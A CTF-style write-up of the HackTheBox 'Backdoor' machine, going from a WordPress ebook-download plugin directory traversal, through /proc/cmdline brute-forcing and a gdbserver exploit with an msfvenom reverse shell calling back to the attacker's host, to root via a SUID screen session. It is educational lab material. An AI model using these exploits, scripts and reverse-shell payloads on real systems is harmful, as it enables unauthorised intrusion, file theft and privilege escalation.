---
title: "HackTheBox - Backdoor"
author: Nasrallah
description: ""
date: 2024-12-13 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, directorytraversal, wordpress, suid, gdb]
img_path: /assets/img/hackthebox/machines/backdoor
image:
    path: backdoor.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Backdoor](https://hacktheboxltd.sjv.io/Nasrallah?u=https://app.hackthebox.com/machines/backdoor) from [HackTheBox](https://hacktheboxltd.sjv.io/anqPJZ) starts with a directory traversal vulnerability we find on a wordpress plugin allowing us to read process's cmdline and find gdbserver listening on a port, we upload a rev shell from there and get foothold. After that we exploit screen and overtake a root session.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Host is up (0.46s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have ssh on port 22 and apache web server on port 80.

### Web

Let's navigate to the website.

![website](1.png)

Wappalyzer tells us that the website is using `wordpress 5.8.1`

![wapp](2.png)

The home button goes to `backdoor.htb` so let's add that to `/etc/hosts` file.

Since we are dealing with `wordpress`, it's a good idea to run `wpscan`.

```terminal
[★]$ wpscan --url http://backdoor.htb/ -e u,vp                                                                                                                                            
_______________________________________________________________                                                                                                                               
         __          _______   _____                                                                                                                                                          
         \ \        / /  __ \ / ____|                                                                                                                                                         
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                                                                                                                                        
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \                                                                                                                                         
            \  /\  /  | |     ____) | (__| (_| | | | |                                                                                                                                        
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|                                                                                                                                        
                                                                                                                                                                                              
         WordPress Security Scanner by the WPScan Team                                                                                                                                        
                         Version 3.8.27                                                                                                                                                       
       Sponsored by Automattic - https://automattic.com/                                                                                                                                      
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                                                                                                                                        
_______________________________________________________________                                                                                                                               
                                                                                                                                                                                              
[+] URL: http://backdoor.htb/ [10.129.96.68]                                                                                                                                                  
[+] Started: Thu Dec 12 18:23:33 2024                                                                                                                                                         
                                                                                                                                                                                              
Interesting Finding(s):                                                                                                                                                                       

[+] Headers                                                                                                                                                                                   
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)                                                                                                                                          
 | Found By: Headers (Passive Detection)                                                                                                                                                      
 | Confidence: 100%                                                                                                                                                                           
                                                                                                                                                                                              
[+] XML-RPC seems to be enabled: http://backdoor.htb/xmlrpc.php                                                                                                                               
 | Found By: Direct Access (Aggressive Detection)                                                                                                                                             
 | Confidence: 100%                                                                                                                                                                           
 | References:                                                                                                                                                                                
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API                                                                                                                                         
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/                                                                                                       
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/                                                                                                              
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/                                                                                                        
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/                                                                                                     
                                                                                                                                                                                              
[+] WordPress readme found: http://backdoor.htb/readme.html                                                                                                                                   
 | Found By: Direct Access (Aggressive Detection)                                                                                                                                             
 | Confidence: 100%                                                                                                                                                                           
                                                                                                                                                                                              
[+] Upload directory has listing enabled: http://backdoor.htb/wp-content/uploads/                                                                                                             
 | Found By: Direct Access (Aggressive Detection)                                                                                                                                             
 | Confidence: 100%                                                                                                                                                                           
                                                                                                                                                                                              
[+] The external WP-Cron seems to be enabled: http://backdoor.htb/wp-cron.php                                                                                                                 
 | Found By: Direct Access (Aggressive Detection)                                                                                                                                             
 | Confidence: 60%                                                                                                                                                                            
 | References:                                                                                                                                                                                
 |  - https://www.iplocation.net/defend-wordpress-from-ddos                                                                                                                                   
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).                                                                                                                    
 | Found By: Rss Generator (Passive Detection)                                                                                                                                                
 |  - http://backdoor.htb/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>                                                                                              
 |  - http://backdoor.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>                                                                                     

[+] WordPress theme in use: twentyseventeen
 | Location: http://backdoor.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-11-12T00:00:00.000Z
 | Readme: http://backdoor.htb/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.8
 | Style URL: http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://backdoor.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection) 

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Dec 12 18:23:38 2024
[+] Requests Done: 13
[+] Cached Requests: 47
[+] Data Sent: 3.381 KB
[+] Data Received: 10.212 KB
[+] Memory used: 270.434 MB
[+] Elapsed time: 00:00:05
```

I scanned for users and plugins, we found user admin but no plugins.

Let's check the plugins directory at `http://backdoor.htb/wp-content/plugins/`

![plugins](3.png)

We found a plugin called `ebood-download`.

A quick search on google reveals a [directory traversal vulnerability](https://www.exploit-db.com/exploits/39575) in this plugin.

```poc
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```

Let's use burp to exploit the vulnerability.

![burp](4.png)

The exploit worked and we managed to read the wp-config file. Unfortunately the password there doesn't work on the login page.

We try `/etc/hosts` maybe find a subdomain but nothing there too.

Running an nmap scan for all ports reveals another port open.

```terminal
Host is up (0.38s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
```

Trying to interact with the port doesn't work.

Since we have a directory traversal we can use that to search for the process running the 1337 port. That can be found in `/proc`.

>The `/proc/` directory, short for "process," contains all the processes running on the system as numbered directories, with each number representing a process's PID. Inside each directory is the `cmdline` file, which contains the command used to start the process.
{: .prompt-info }

We need to brute force the process number and print the content of `cmdline` file.

I wrote this simple python script that does just that.

```python
import requests

def main():
    print("[+] Starting brute force...")
    
    session = requests.Session()
    
    for i in range(0,5000):
        url = f"http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/{i}/cmdline"
        response = session.get(url)
        re = "cmdline<script"

        content = response.content.decode('utf-8', errors='replace').replace('\x00', ' ')
        if re not in content:
            print(f"PID[{i}]: {content[96:-32]}")

if __name__ == "__main__":
    main()

```

```terminal
[★]$ python exploit.py                                                                     
[+] Starting brute force...                                                                    
PID[1]: init auto automatic-ubiquity noprompt                                                  
PID[485]: /lib/systemd/systemd-journald 
PID[516]: /lib/systemd/systemd-udevd    
PID[525]: /lib/systemd/systemd-networkd                                                        
PID[657]: /sbin/multipathd -d -s         
PID[658]: /sbin/multipathd -d -s         
PID[659]: /sbin/multipathd -d -s                                                               
PID[660]: /sbin/multipathd -d -s                                                                                                                                                              
PID[661]: /sbin/multipathd -d -s                                                                                                                                                              
PID[662]: /sbin/multipathd -d -s                                                               
PID[663]: /sbin/multipathd -d -s                                                               
PID[679]: /lib/systemd/systemd-timesyncd
[...]
PID[955]: /usr/sbin/atd -f
PID[971]: /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
PID[973]: /bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
PID[980]: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
PID[983]: /sbin/agetty -o -p -- \u --noclear tty1 linux
PID[985]: /lib/systemd/systemd --user
PID[986]: (sd-pam)
PID[990]: /usr/sbin/apache2 -k start

```

We found the following command.

```bash
/bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
```

It's running a gdbserver on port 1337.

## **Foothold**

This hacktricks [page](https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver) explains how to exploit remote gdbserver.

First we create an `elf` reverser shell.

```terminal
[★]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.18 LPORT=9001 PrependFork=true -f elf -o shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Final size of elf file: 226 bytes
Saved as: shell.elf
```

Now we open the file on our machine.

```terminal
[★]$ gdb -q shell    
Reading symbols from rev.elf...
(No debugging symbols found in rev.elf)
(gdb)
```

Then we connect to the remote server on port 1337.

```terminal
(gdb) target extended-remote 10.129.96.68:1337
Remote debugging using 10.129.96.68:1337
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
Reading symbols from target:/lib64/ld-linux-x86-64.so.2...
Reading /usr/lib/debug/.build-id/53/74b5558386b815e69cc1838a6052cc9b4746f3.debug from remote target...
Reading /lib64/ld-2.31.so from remote target...
Reading /lib64/.debug/ld-2.31.so from remote target...
Reading /usr/lib/debug//lib64/ld-2.31.so from remote target...
Reading /usr/lib/debug/lib64//ld-2.31.so from remote target...
Reading target:/usr/lib/debug/lib64//ld-2.31.so from remote target...
(No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2)
Reading /usr/lib/debug/.build-id/42/86d016f71e32db3a4f7221c847c3d1e13d6bd4.debug from remote target...
0x00007ffff7fd0100 in ?? () from target:/lib64/ld-linux-x86-64.so.2
```

Great! Now we upload the file.

```terminal
(gdb) remote put shell.elf /dev/shm/shell.elf
Successfully sent file "shell.elf".
```

And now we setup our listener and run the binary.

```terminal
(gdb) set remote exec-file /dev/shm/shell.elf
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program:  
Reading /dev/shm/shell.elf from remote target...
Reading /dev/shm/shell.elf from remote target...
Reading symbols from target:/dev/shm/shell.elf...
(No debugging symbols found in target:/dev/shm/shell.elf)
Reading /usr/lib/debug/.build-id/42/86d016f71e32db3a4f7221c847c3d1e13d6bd4.debug from remote target...
[Detaching after fork from child process 16518]
[Inferior 1 (process 16505) exited normally]
```

```terminal
[★]$ nc -lvnp 9001        
listening on [any] 9001 ...
connect to [10.10.16.18] from (UNKNOWN) [10.129.96.68] 43574
id
uid=1000(user) gid=1000(user) groups=1000(user)
```

We got the shell.

There is another easy way to exploit this and it's with the metasploit module `exploit/multi/gdb/gdb_server_exec`.

```terminal
[msf](Jobs:0 Agents:0) exploit(multi/gdb/gdb_server_exec) >> set lhost tun0
lhost => 10.10.16.18
[msf](Jobs:0 Agents:0) exploit(multi/gdb/gdb_server_exec) >> set lport 9001
lport => 9001
[msf](Jobs:0 Agents:0) exploit(multi/gdb/gdb_server_exec) >> set rhosts 10.129.96.68
rhosts => 10.129.96.68
[msf](Jobs:0 Agents:0) exploit(multi/gdb/gdb_server_exec) >> set rport 1337
rport => 1337
[msf](Jobs:0 Agents:0) exploit(multi/gdb/gdb_server_exec) >> set payload linux/x64/shell_reverse_tcp
payload => linux/x64/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/gdb/gdb_server_exec) >> run

[*] Started reverse TCP handler on 10.10.16.18:9001 
[*] 10.129.96.68:1337 - Performing handshake with gdbserver...
[*] 10.129.96.68:1337 - Stepping program to find PC...
[*] 10.129.96.68:1337 - Writing payload at 00007ffff7fd0103...
[*] 10.129.96.68:1337 - Executing the payload...
[*] Command shell session 1 opened (10.10.16.18:9001 -> 10.129.96.68:43478) at 2024-12-12 19:45:13 +0100

id
uid=1000(user) gid=1000(user) groups=1000(user)
```

Let's get a stable shell.

```terminal
script /dev/null -qc /bin/bash
user@Backdoor:/home/user$ export TERM=xterm
export TERM=xterm
user@Backdoor:/home/user$ ^Z
zsh: suspended  nc -lvnp 9001
                                                                                                                                                                                              
┌──[10.10.16.18]─[sirius💀parrot]-[~/ctf/htb/backdoor]
└──╼[★]$ stty raw -echo;fg             
[1]  + continued  nc -lvnp 9001

user@Backdoor:/home/user$ 

```

## **Privilege Escalation**

Running linpeas we find an interesting process.

![linpeas](5.png)

The find command checks if the `/var/run/screen/S-root/` is empty, if it is is run `screen -dmS root` which start a screen session with the name of root.

We can see that screen has the suid bit

```bash
-rwsr-xr-x 1 root root 464K Feb 23  2021 /usr/bin/screen 
```

This means we can check the root's session.

```terminal
user@Backdoor:/home/user$ screen -ls root/
There is a suitable screen on:
        1007.root       (12/12/24 17:12:12)     (Multi, detached)
1 Socket in /run/screen/S-root.
```

We found a screen session that belongs to root, I connected to that session using the following command

```bash
screen -x root/
```

```terminal
root@Backdoor:~# id                                                                                                                                                                           
uid=0(root) gid=0(root) groups=0(root)
```

And just like that we got root!

## **References**

<https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver>

<https://www.exploit-db.com/exploits/39575>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
